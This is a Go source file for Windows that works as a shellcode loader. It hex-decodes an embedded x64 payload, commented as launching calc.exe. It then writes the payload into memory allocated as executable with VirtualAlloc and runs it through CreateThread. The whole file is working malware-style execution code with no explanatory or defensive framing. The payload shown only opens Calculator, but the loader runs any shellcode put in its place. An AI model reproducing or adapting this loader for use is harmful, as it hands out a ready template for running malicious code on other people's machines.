package main

import (
	"encoding/hex"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

const (
	PROCESS_ALL_ACCESS     = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
	MEM_COMMIT             = 0x001000
	MEM_RESERVE            = 0x002000
	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_EXECUTE_READ      = 0x20
)

var (
	kernel32            = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	VirtualProtect      = kernel32.NewProc("VirtualProtect")
	WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
	ntdll               = syscall.NewLazyDLL("ntdll.dll")
	RtlCopyMemory       = ntdll.NewProc("RtlCopyMemory")
	CreateThread        = kernel32.NewProc("CreateThread")
)

func main() {
	//calc.exe
	var payload string = "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500"

	shellcode, err := hex.DecodeString(payload)
	if err != nil {
		fmt.Printf("\nError decoding shellcode: %s\n", err)
		os.Exit(1)
	}
	//allocating memory region using vitualAlloc
	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	//Writing shellcode into the newly created region
	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))

	for i := 0; i < len(shellcode); i++ {
		AddrPtr[i] = shellcode[i]
	}
	//Calling the shellcode using createthread call
	ThreadAddr, _, _ := CreateThread.Call(0, 0, Addr, 0, 0, 0)
	//waitforsingle object to keep the thread alive
	WaitForSingleObject.Call(ThreadAddr, 0xFFFFFFFF)
}
